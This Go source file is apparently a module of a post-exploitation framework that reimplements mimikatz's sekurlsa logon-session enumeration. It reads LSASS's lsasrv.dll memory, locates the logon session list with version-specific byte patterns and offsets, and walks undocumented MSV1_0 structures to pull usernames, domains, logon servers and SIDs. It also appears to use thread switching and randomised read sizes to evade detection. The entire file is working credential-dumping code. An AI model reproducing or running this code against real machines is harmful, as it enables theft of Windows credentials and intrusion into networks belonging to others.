package kiwi

import (
	"bytes"
	"runtime"
	"time"
	"unsafe"

	"github.com/pkg/errors"
	"golang.org/x/sys/windows"

	"project/internal/logger"
	"project/internal/module/windows/api"
	"project/internal/security"
)

// session is contains information about logon session list.
type session struct {
	ctx *Kiwi

	// address about logon session list
	listAddr      uintptr
	listCountAddr uintptr
}

func newSession(ctx *Kiwi) *session {
	return &session{ctx: ctx}
}

func (session *session) logf(lv logger.Level, format string, log ...interface{}) {
	session.ctx.logger.Printf(lv, "kiwi-session", format, log...)
}

func (session *session) log(lv logger.Level, log ...interface{}) {
	session.ctx.logger.Println(lv, "kiwi-session", log...)
}

// reference:
// https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_utils.c

var (
	patternWin5xX64LogonSessionList = []byte{
		0x4C, 0x8B, 0xDF, 0x49, 0xC1, 0xE3, 0x04, 0x48, 0x8B, 0xCB, 0x4C, 0x03, 0xD8,
	}
	patternWin60X64LogonSessionList = []byte{
		0x33, 0xFF, 0x45, 0x85, 0xC0, 0x41, 0x89, 0x75, 0x00, 0x4C, 0x8B, 0xE3, 0x0F, 0x84,
	}
	patternWin61X64LogonSessionList = []byte{
		0x33, 0xF6, 0x45, 0x89, 0x2F, 0x4C, 0x8B, 0xF3, 0x85, 0xFF, 0x0F, 0x84,
	}
	patternWin63X64LogonSessionList = []byte{
		0x8B, 0xDE, 0x48, 0x8D, 0x0C, 0x5B, 0x48, 0xC1, 0xE1, 0x05, 0x48, 0x8D, 0x05,
	}
	patternWin6xX64LogonSessionList = []byte{
		0x33, 0xFF, 0x41, 0x89, 0x37, 0x4C, 0x8B, 0xF3, 0x45, 0x85, 0xC0, 0x74,
	}
	patternWin1703X64LogonSessionList = []byte{
		0x33, 0xFF, 0x45, 0x89, 0x37, 0x48, 0x8B, 0xF3, 0x45, 0x85, 0xC9, 0x74,
	}
	patternWin1803X64LogonSessionList = []byte{
		0x33, 0xFF, 0x45, 0x89, 0x37, 0x48, 0x8B, 0xF3, 0x45, 0x85, 0xC9, 0x74,
	}

	lsaSrvReferencesX64 = []*patchGeneric{
		{
			minBuild: buildWinXP,
			search: &patchPattern{
				length: len(patternWin5xX64LogonSessionList),
				data:   patternWin5xX64LogonSessionList,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: -4, off1: 0},
		},
		{
			minBuild: buildWin2003,
			search: &patchPattern{
				length: len(patternWin5xX64LogonSessionList),
				data:   patternWin5xX64LogonSessionList,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: -4, off1: -45},
		},
		{
			minBuild: buildWinVista,
			search: &patchPattern{
				length: len(patternWin60X64LogonSessionList),
				data:   patternWin60X64LogonSessionList,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: 21, off1: -4},
		},
		{
			minBuild: buildWin7,
			search: &patchPattern{
				length: len(patternWin61X64LogonSessionList),
				data:   patternWin61X64LogonSessionList,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: 19, off1: -4},
		},
		{
			minBuild: buildWin8,
			search: &patchPattern{
				length: len(patternWin6xX64LogonSessionList),
				data:   patternWin6xX64LogonSessionList,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: 16, off1: -4},
		},
		{
			minBuild: buildWin81,
			search: &patchPattern{
				length: len(patternWin63X64LogonSessionList),
				data:   patternWin63X64LogonSessionList,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: 36, off1: -6},
		},
		{
			minBuild: buildWin10v1507,
			search: &patchPattern{
				length: len(patternWin6xX64LogonSessionList),
				data:   patternWin6xX64LogonSessionList,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: 16, off1: -4},
		},
		{
			minBuild: buildWin10v1703,
			search: &patchPattern{
				length: len(patternWin1703X64LogonSessionList),
				data:   patternWin1703X64LogonSessionList,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: 23, off1: -4},
		},
		{
			minBuild: buildWin10v1803,
			search: &patchPattern{
				length: len(patternWin1803X64LogonSessionList),
				data:   patternWin1803X64LogonSessionList,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: 23, off1: -4},
		},
		{
			minBuild: buildWin10v1903,
			search: &patchPattern{
				length: len(patternWin6xX64LogonSessionList),
				data:   patternWin6xX64LogonSessionList,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: 23, off1: -4},
		},
	}
)

var (
	patternWin5xX86LogonSessionList = []byte{
		0xFF, 0x50, 0x10, 0x85, 0xC0, 0x0F, 0x84,
	}
	patternWin7X86LogonSessionList = []byte{
		0x89, 0x71, 0x04, 0x89, 0x30, 0x8D, 0x04, 0xBD,
	}
	patternWin80X86LogonSessionList = []byte{
		0x8B, 0x45, 0xF8, 0x8B, 0x55, 0x08, 0x8B, 0xDE, 0x89, 0x02, 0x89, 0x5D, 0xF0, 0x85, 0xC9, 0x74,
	}
	patternWin81X86LogonSessionList = []byte{
		0x8B, 0x4D, 0xE4, 0x8B, 0x45, 0xF4, 0x89, 0x75, 0xE8, 0x89, 0x01, 0x85, 0xFF, 0x74,
	}
	patternWin6xX86LogonSessionList = []byte{
		0x8B, 0x4D, 0xE8, 0x8B, 0x45, 0xF4, 0x89, 0x75, 0xEC, 0x89, 0x01, 0x85, 0xFF, 0x74,
	}

	lsaSrvReferencesX86 = []*patchGeneric{
		{
			minBuild: buildWinXP,
			search: &patchPattern{
				length: len(patternWin5xX86LogonSessionList),
				data:   patternWin5xX86LogonSessionList,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: 24, off1: 0},
		},
		{
			minBuild: buildWin2003,
			search: &patchPattern{
				length: len(patternWin7X86LogonSessionList),
				data:   patternWin7X86LogonSessionList,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: -11, off1: -43},
		},
		{
			minBuild: buildWinVista,
			search: &patchPattern{
				length: len(patternWin7X86LogonSessionList),
				data:   patternWin7X86LogonSessionList,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: -11, off1: -42},
		},
		{
			minBuild: buildWin8,
			search: &patchPattern{
				length: len(patternWin80X86LogonSessionList),
				data:   patternWin80X86LogonSessionList,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: 18, off1: -4},
		},
		{
			minBuild: buildWin81,
			search: &patchPattern{
				length: len(patternWin81X86LogonSessionList),
				data:   patternWin81X86LogonSessionList,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: 16, off1: -4},
		},
		{
			minBuild: buildWin10v1507,
			search: &patchPattern{
				length: len(patternWin6xX86LogonSessionList),
				data:   patternWin6xX86LogonSessionList,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: 16, off1: -4},
		},
	}
)

func (session *session) searchAddresses(pHandle windows.Handle) error {
	done := security.SwitchThreadAsync()
	defer session.ctx.waitSwitchThreadAsync(done)
	lsasrv, err := session.ctx.lsass.GetBasicModuleInfo(pHandle, "lsasrv.dll")
	if err != nil {
		return err
	}
	// read lsasrv.dll memory
	size := uintptr(lsasrv.size - (256 - session.ctx.rand.Int(256)))
	memory := make([]byte, size)
	_, err = api.ReadProcessMemory(pHandle, lsasrv.address, &memory[0], size)
	if err != nil {
		return errors.WithMessage(err, "failed to read memory about lsasrv.dll")
	}
	// search logon session list pattern
	var patches []*patchGeneric
	switch runtime.GOARCH {
	case "386":
		patches = lsaSrvReferencesX86
	case "amd64":
		patches = lsaSrvReferencesX64
	}
	patch := session.ctx.selectGenericPatch(patches)
	index := bytes.Index(memory, patch.search.data)
	if index == -1 {
		return errors.New("failed to search logon session list reference pattern")
	}
	// read logon session list address
	address := lsasrv.address + uintptr(index+patch.offsets.off0)
	var offset int32
	size = unsafe.Sizeof(offset)
	err = session.ctx.readMemory(pHandle, address, (*byte)(unsafe.Pointer(&offset)), size)
	if err != nil {
		return errors.WithMessage(err, "failed to read offset about logon session list address")
	}
	listAddr := address + unsafe.Sizeof(offset) + uintptr(offset)
	session.logf(logger.Debug, "logon session list address is 0x%X", listAddr)
	// read logon session list count
	address = lsasrv.address + uintptr(index+patch.offsets.off1)
	err = session.ctx.readMemory(pHandle, address, (*byte)(unsafe.Pointer(&offset)), size)
	if err != nil {
		return errors.WithMessage(err, "failed to read offset about logon session list count")
	}
	listCountAddr := address + unsafe.Sizeof(offset) + uintptr(offset)
	session.logf(logger.Debug, "logon session list count address is 0x%X", listCountAddr)
	session.listAddr = listAddr
	session.listCountAddr = listCountAddr
	return nil
}

// reference:
// https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_utils.h

// nolint:structcheck, unused
type msv10List51 struct {
	fLink         uintptr // point to msv10List51
	bLink         uintptr // point to msv10List51
	logonID       windows.LUID
	username      api.LSAUnicodeString
	domainName    api.LSAUnicodeString
	unknown0      uintptr
	unknown1      uintptr
	sid           uintptr
	logonType     uint32
	session       uint32
	logonTime     int64 // auto align x86
	logonServer   api.LSAUnicodeString
	credentials   uintptr
	unknown19     uint32
	unknown20     uintptr
	unknown21     uintptr
	unknown22     uintptr
	unknown23     uint32
	credentialMgr uintptr
}

// nolint:structcheck, unused
type msv10List52 struct {
	fLink         uintptr // point to msv10List52
	bLink         uintptr // point to msv10List52
	logonID       windows.LUID
	username      api.LSAUnicodeString
	domainName    api.LSAUnicodeString
	unknown0      uintptr
	unknown1      uintptr
	sid           uintptr
	logonType     uint32
	session       uint32
	logonTime     int64 // auto align x86
	logonServer   api.LSAUnicodeString
	credentials   uintptr
	unknown19     uint32
	unknown20     uintptr
	unknown21     uintptr
	unknown22     uint32
	credentialMgr uintptr
}

// nolint:structcheck, unused
type msv10List60 struct {
	fLink         uintptr // point to msv10List60
	bLink         uintptr // point to msv10List60
	unknown0      uintptr
	unknown1      uint32
	unknown2      uintptr
	unknown3      uint32
	unknown4      uint32
	unknown5      uint32
	hSemaphore6   uintptr
	unknown7      uintptr
	hSemaphore8   uintptr
	unknown9      uintptr
	unknown10     uintptr
	unknown11     uint32
	unknown12     uint32
	unknown13     uintptr
	logonID       windows.LUID
	luid1         windows.LUID
	username      api.LSAUnicodeString
	domainName    api.LSAUnicodeString
	unknown14     uintptr
	unknown15     uintptr
	sid           uintptr
	logonType     uint32
	session       uint32
	logonTime     int64 // auto align x86
	logonServer   api.LSAUnicodeString
	credentials   uintptr
	unknown19     uint32
	unknown20     uintptr
	unknown21     uintptr
	unknown22     uintptr
	unknown23     uint32
	credentialMgr uintptr
}

// nolint:structcheck, unused
type msv10List61 struct {
	fLink         uintptr // point to msv10List61
	bLink         uintptr // point to msv10List61
	unknown0      uintptr
	unknown1      uint32
	unknown2      uintptr
	unknown3      uint32
	unknown4      uint32
	unknown5      uint32
	hSemaphore6   uintptr
	unknown7      uintptr
	hSemaphore8   uintptr
	unknown9      uintptr
	unknown10     uintptr
	unknown11     uint32
	unknown12     uint32
	unknown13     uintptr
	logonID       windows.LUID
	luid1         windows.LUID
	username      api.LSAUnicodeString
	domainName    api.LSAUnicodeString
	unknown14     uintptr
	unknown15     uintptr
	sid           uintptr
	logonType     uint32
	session       uint32
	logonTime     int64 // auto align x86
	logonServer   api.LSAUnicodeString
	credentials   uintptr
	unknown19     uintptr
	unknown20     uintptr
	unknown21     uintptr
	unknown22     uint32
	credentialMgr uintptr
}

// nolint:structcheck, unused
type msv10List61AntiKiwi struct {
	fLink         uintptr // point to msv10List61AntiKiwi
	bLink         uintptr // point to msv10List61AntiKiwi
	unknown0      uintptr
	unknown1      uint32
	unknown2      uintptr
	unknown3      uint32
	unknown4      uint32
	unknown5      uint32
	hSemaphore6   uintptr
	unknown7      uintptr
	hSemaphore8   uintptr
	unknown9      uintptr
	unknown10     uintptr
	unknown11     uint32
	unknown12     uint32
	unknown13     uintptr
	logonID       windows.LUID
	luid1         windows.LUID
	waZa          [12]byte
	username      api.LSAUnicodeString
	domainName    api.LSAUnicodeString
	unknown14     uintptr
	unknown15     uintptr
	sid           uintptr
	logonType     uint32
	session       uint32
	logonTime     int64 // auto align x86
	logonServer   api.LSAUnicodeString
	credentials   uintptr
	unknown19     uintptr
	unknown20     uintptr
	unknown21     uintptr
	unknown22     uint32
	credentialMgr uintptr
}

// nolint:structcheck, unused
type msv10List62 struct {
	fLink         uintptr // point to msv10List62
	bLink         uintptr // point to msv10List62
	unknown0      uintptr
	unknown1      uint32
	unknown2      uintptr
	unknown3      uint32
	unknown4      uint32
	unknown5      uint32
	hSemaphore6   uintptr
	unknown7      uintptr
	hSemaphore8   uintptr
	unknown9      uintptr
	unknown10     uintptr
	unknown11     uint32
	unknown12     uint32
	unknown13     uintptr
	logonID       windows.LUID
	luid1         windows.LUID
	username      api.LSAUnicodeString
	domainName    api.LSAUnicodeString
	unknown14     uintptr
	unknown15     uintptr
	typ           api.LSAUnicodeString
	sid           uintptr
	logonType     uint32
	unknown18     uintptr
	session       uint32
	logonTime     int64 // auto align x86
	logonServer   api.LSAUnicodeString
	credentials   uintptr
	unknown19     uintptr
	unknown20     uintptr
	unknown21     uintptr
	unknown22     uint32
	unknown23     uint32
	unknown24     uint32
	unknown25     uint32
	unknown26     uint32
	unknown27     uintptr
	unknown28     uintptr
	unknown29     uintptr
	credentialMgr uintptr
}

// nolint:structcheck, unused
type msv10List63 struct {
	fLink         uintptr // point to msv10List63
	bLink         uintptr // point to msv10List63
	unknown0      uintptr
	unknown1      uint32
	unknown2      uintptr
	unknown3      uint32
	unknown4      uint32
	unknown5      uint32
	hSemaphore6   uintptr
	unknown7      uintptr
	hSemaphore8   uintptr
	unknown9      uintptr
	unknown10     uintptr
	unknown11     uint32
	unknown12     uint32
	unknown13     uintptr
	logonID       windows.LUID
	luid1         windows.LUID
	waZa          [12]byte
	username      api.LSAUnicodeString
	domainName    api.LSAUnicodeString
	unknown14     uintptr
	unknown15     uintptr
	typ           api.LSAUnicodeString
	sid           uintptr
	logonType     uint32
	unknown18     uintptr
	session       uint32
	logonTime     int64 // auto align x86
	logonServer   api.LSAUnicodeString
	credentials   uintptr
	unknown19     uintptr
	unknown20     uintptr
	unknown21     uintptr
	unknown22     uint32
	unknown23     uint32
	unknown24     uint32
	unknown25     uint32
	unknown26     uint32
	unknown27     uintptr
	unknown28     uintptr
	unknown29     uintptr
	credentialMgr uintptr
}

// reference:
// https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c

type lsaEnum struct {
	size                  uintptr
	offsetToLogonID       uint32
	offsetToLogonType     uint32
	offsetToSession       uint32
	offsetToUsername      uint32
	offsetToDomainName    uint32
	offsetToCredentials   uint32
	offsetToSID           uint32
	offsetToCredentialMgr uint32
	offsetToLogonTime     uint32
	offsetToLogonServer   uint32
}

// nolint:unused
var (
	msv10List51Struct   = msv10List51{}
	msv10List52Struct   = msv10List52{}
	msv10List60Struct   = msv10List60{}
	msv10List61Struct   = msv10List61{}
	msv10List61AKStruct = msv10List61AntiKiwi{}
	msv10List62Struct   = msv10List62{}
	msv10List63Struct   = msv10List63{}

	lsaEnums = []*lsaEnum{
		{
			size:                  unsafe.Sizeof(msv10List51Struct),
			offsetToLogonID:       uint32(unsafe.Offsetof(msv10List51Struct.logonID)),
			offsetToLogonType:     uint32(unsafe.Offsetof(msv10List51Struct.logonType)),
			offsetToSession:       uint32(unsafe.Offsetof(msv10List51Struct.session)),
			offsetToUsername:      uint32(unsafe.Offsetof(msv10List51Struct.username)),
			offsetToDomainName:    uint32(unsafe.Offsetof(msv10List51Struct.domainName)),
			offsetToCredentials:   uint32(unsafe.Offsetof(msv10List51Struct.credentials)),
			offsetToSID:           uint32(unsafe.Offsetof(msv10List51Struct.sid)),
			offsetToCredentialMgr: uint32(unsafe.Offsetof(msv10List51Struct.credentialMgr)),
			offsetToLogonTime:     uint32(unsafe.Offsetof(msv10List51Struct.logonTime)),
			offsetToLogonServer:   uint32(unsafe.Offsetof(msv10List51Struct.logonServer)),
		},
		{
			size:                  unsafe.Sizeof(msv10List52Struct),
			offsetToLogonID:       uint32(unsafe.Offsetof(msv10List52Struct.logonID)),
			offsetToLogonType:     uint32(unsafe.Offsetof(msv10List52Struct.logonType)),
			offsetToSession:       uint32(unsafe.Offsetof(msv10List52Struct.session)),
			offsetToUsername:      uint32(unsafe.Offsetof(msv10List52Struct.username)),
			offsetToDomainName:    uint32(unsafe.Offsetof(msv10List52Struct.domainName)),
			offsetToCredentials:   uint32(unsafe.Offsetof(msv10List52Struct.credentials)),
			offsetToSID:           uint32(unsafe.Offsetof(msv10List52Struct.sid)),
			offsetToCredentialMgr: uint32(unsafe.Offsetof(msv10List52Struct.credentialMgr)),
			offsetToLogonTime:     uint32(unsafe.Offsetof(msv10List52Struct.logonTime)),
			offsetToLogonServer:   uint32(unsafe.Offsetof(msv10List52Struct.logonServer)),
		},
		{
			size:                  unsafe.Sizeof(msv10List60Struct),
			offsetToLogonID:       uint32(unsafe.Offsetof(msv10List60Struct.logonID)),
			offsetToLogonType:     uint32(unsafe.Offsetof(msv10List60Struct.logonType)),
			offsetToSession:       uint32(unsafe.Offsetof(msv10List60Struct.session)),
			offsetToUsername:      uint32(unsafe.Offsetof(msv10List60Struct.username)),
			offsetToDomainName:    uint32(unsafe.Offsetof(msv10List60Struct.domainName)),
			offsetToCredentials:   uint32(unsafe.Offsetof(msv10List60Struct.credentials)),
			offsetToSID:           uint32(unsafe.Offsetof(msv10List60Struct.sid)),
			offsetToCredentialMgr: uint32(unsafe.Offsetof(msv10List60Struct.credentialMgr)),
			offsetToLogonTime:     uint32(unsafe.Offsetof(msv10List60Struct.logonTime)),
			offsetToLogonServer:   uint32(unsafe.Offsetof(msv10List60Struct.logonServer)),
		},
		{
			size:                  unsafe.Sizeof(msv10List61Struct),
			offsetToLogonID:       uint32(unsafe.Offsetof(msv10List61Struct.logonID)),
			offsetToLogonType:     uint32(unsafe.Offsetof(msv10List61Struct.logonType)),
			offsetToSession:       uint32(unsafe.Offsetof(msv10List61Struct.session)),
			offsetToUsername:      uint32(unsafe.Offsetof(msv10List61Struct.username)),
			offsetToDomainName:    uint32(unsafe.Offsetof(msv10List61Struct.domainName)),
			offsetToCredentials:   uint32(unsafe.Offsetof(msv10List61Struct.credentials)),
			offsetToSID:           uint32(unsafe.Offsetof(msv10List61Struct.sid)),
			offsetToCredentialMgr: uint32(unsafe.Offsetof(msv10List61Struct.credentialMgr)),
			offsetToLogonTime:     uint32(unsafe.Offsetof(msv10List61Struct.logonTime)),
			offsetToLogonServer:   uint32(unsafe.Offsetof(msv10List61Struct.logonServer)),
		},
		{
			size:                  unsafe.Sizeof(msv10List61AKStruct),
			offsetToLogonID:       uint32(unsafe.Offsetof(msv10List61AKStruct.logonID)),
			offsetToLogonType:     uint32(unsafe.Offsetof(msv10List61AKStruct.logonType)),
			offsetToSession:       uint32(unsafe.Offsetof(msv10List61AKStruct.session)),
			offsetToUsername:      uint32(unsafe.Offsetof(msv10List61AKStruct.username)),
			offsetToDomainName:    uint32(unsafe.Offsetof(msv10List61AKStruct.domainName)),
			offsetToCredentials:   uint32(unsafe.Offsetof(msv10List61AKStruct.credentials)),
			offsetToSID:           uint32(unsafe.Offsetof(msv10List61AKStruct.sid)),
			offsetToCredentialMgr: uint32(unsafe.Offsetof(msv10List61AKStruct.credentialMgr)),
			offsetToLogonTime:     uint32(unsafe.Offsetof(msv10List61AKStruct.logonTime)),
			offsetToLogonServer:   uint32(unsafe.Offsetof(msv10List61AKStruct.logonServer)),
		},
		{
			size:                  unsafe.Sizeof(msv10List62Struct),
			offsetToLogonID:       uint32(unsafe.Offsetof(msv10List62Struct.logonID)),
			offsetToLogonType:     uint32(unsafe.Offsetof(msv10List62Struct.logonType)),
			offsetToSession:       uint32(unsafe.Offsetof(msv10List62Struct.session)),
			offsetToUsername:      uint32(unsafe.Offsetof(msv10List62Struct.username)),
			offsetToDomainName:    uint32(unsafe.Offsetof(msv10List62Struct.domainName)),
			offsetToCredentials:   uint32(unsafe.Offsetof(msv10List62Struct.credentials)),
			offsetToSID:           uint32(unsafe.Offsetof(msv10List62Struct.sid)),
			offsetToCredentialMgr: uint32(unsafe.Offsetof(msv10List62Struct.credentialMgr)),
			offsetToLogonTime:     uint32(unsafe.Offsetof(msv10List62Struct.logonTime)),
			offsetToLogonServer:   uint32(unsafe.Offsetof(msv10List62Struct.logonServer)),
		},
		{
			size:                  unsafe.Sizeof(msv10List63Struct),
			offsetToLogonID:       uint32(unsafe.Offsetof(msv10List63Struct.logonID)),
			offsetToLogonType:     uint32(unsafe.Offsetof(msv10List63Struct.logonType)),
			offsetToSession:       uint32(unsafe.Offsetof(msv10List63Struct.session)),
			offsetToUsername:      uint32(unsafe.Offsetof(msv10List63Struct.username)),
			offsetToDomainName:    uint32(unsafe.Offsetof(msv10List63Struct.domainName)),
			offsetToCredentials:   uint32(unsafe.Offsetof(msv10List63Struct.credentials)),
			offsetToSID:           uint32(unsafe.Offsetof(msv10List63Struct.sid)),
			offsetToCredentialMgr: uint32(unsafe.Offsetof(msv10List63Struct.credentialMgr)),
			offsetToLogonTime:     uint32(unsafe.Offsetof(msv10List63Struct.logonTime)),
			offsetToLogonServer:   uint32(unsafe.Offsetof(msv10List63Struct.logonServer)),
		},
	}
)

// reference:
// https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c#L318

func (session *session) selectLSAEnum(pHandle windows.Handle) (*lsaEnum, error) {
	_, _, build := session.ctx.getWindowsVersion()
	var i int
	switch {
	case build < buildMinWin2003:
		i = 0 // 5.1
	case build < buildMinWinVista:
		i = 1 // 5.2
	case build < buildMinWin7:
		i = 2 // 6.0
	case build < buildMinWin8:
		i = 3 // 6.1
	case build < buildMinWin81:
		i = 5 // 6.2
	default:
		i = 6 // 6.3
	}
	// something funny about anti mimikatz
	if build >= buildMinWin7 && build < buildMinWin81 {
		lsasrv, err := session.ctx.lsass.GetBasicModuleInfo(pHandle, "lsasrv.dll")
		if err != nil {
			return nil, err
		}
		if lsasrv.timestamp > 0x53480000 { // 2014-04-11 22:45:20
			i++
		}
	}
	return lsaEnums[i], nil
}

// Session contains information about logon session.
type Session struct {
	LogonID     windows.LUID
	Session     uint32
	Domain      string
	Username    string
	LogonServer string
	LogonTime   time.Time
	SID         string
}

func (session *session) GetLogonSessionList(pHandle windows.Handle) ([]*Session, error) {
	if session.listAddr == 0 {
		err := session.searchAddresses(pHandle)
		if err != nil {
			return nil, errors.WithMessage(err, "failed to search address about logon session list")
		}
	}
	done := security.SwitchThreadAsync()
	defer session.ctx.waitSwitchThreadAsync(done)
	// get session list count
	address := session.listCountAddr
	var count uint32
	size := unsafe.Sizeof(count)
	err := session.ctx.readMemory(pHandle, address, (*byte)(unsafe.Pointer(&count)), size)
	if err != nil {
		return nil, errors.WithMessage(err, "failed to read logon session list count")
	}
	session.log(logger.Debug, "logon session list count is", count)
	enum, err := session.selectLSAEnum(pHandle)
	if err != nil {
		return nil, errors.WithMessage(err, "failed to select lsa enum")
	}
	// get session list
	var logonSessions []*Session
	const listEntrySize = 2 * unsafe.Sizeof(uintptr(0))
	listAddr := session.listAddr - listEntrySize
	// prevent dead loop
	ticker := time.NewTicker(3 * time.Millisecond)
	defer ticker.Stop()
	for i := uint32(0); i < count; i++ {
		listAddr += listEntrySize
		// read logon session data address
		var addr uintptr
		size := unsafe.Sizeof(addr)
		err := session.ctx.readMemory(pHandle, listAddr, (*byte)(unsafe.Pointer(&addr)), size)
		if err != nil {
			return nil, errors.WithMessage(err, "failed to read logon session data address")
		}
		for {
			// prevent dead loop
			select {
			case <-ticker.C:
			case <-session.ctx.context.Done():
				return nil, session.ctx.context.Err()
			}
			if addr == listAddr {
				break
			}
			// read logon session data
			buf := make([]byte, enum.size)
			err := session.ctx.readMemory(pHandle, addr, &buf[0], enum.size)
			if err != nil {
				return nil, errors.WithMessage(err, "failed to read logon session memory")
			}
			logonSession, err := session.readSession(pHandle, buf, enum)
			if err != nil {
				return nil, errors.WithMessage(err, "failed to read logon session data")
			}
			logonSessions = append(logonSessions, logonSession)
			addr = *(*uintptr)(unsafe.Pointer(&buf[0]))
		}
	}
	return logonSessions, nil
}

func (session *session) readSession(pHandle windows.Handle, buf []byte, enum *lsaEnum) (*Session, error) {
	domainNameLus := (*api.LSAUnicodeString)(unsafe.Pointer(&buf[enum.offsetToDomainName]))
	domainName, err := session.ctx.readLSAUnicodeString(pHandle, domainNameLus)
	if err != nil {
		return nil, err
	}
	usernameLus := (*api.LSAUnicodeString)(unsafe.Pointer(&buf[enum.offsetToUsername]))
	username, err := session.ctx.readLSAUnicodeString(pHandle, usernameLus)
	if err != nil {
		return nil, err
	}
	logonServerLus := (*api.LSAUnicodeString)(unsafe.Pointer(&buf[enum.offsetToLogonServer]))
	logonServer, err := session.ctx.readLSAUnicodeString(pHandle, logonServerLus)
	if err != nil {
		return nil, err
	}
	var sid string
	sidAddr := *(*uintptr)(unsafe.Pointer(&buf[enum.offsetToSID]))
	if sidAddr != 0x00 {
		sid, err = session.ctx.readSID(pHandle, sidAddr)
		if err != nil {
			return nil, err
		}
	}
	logonID := *(*windows.LUID)(unsafe.Pointer(&buf[enum.offsetToLogonID]))
	logonSession := Session{
		LogonID:     logonID,
		Domain:      domainName,
		Username:    username,
		LogonServer: logonServer,
		SID:         sid,
	}
	return &logonSession, nil
}

func (session *session) Close() {
	session.ctx = nil
}
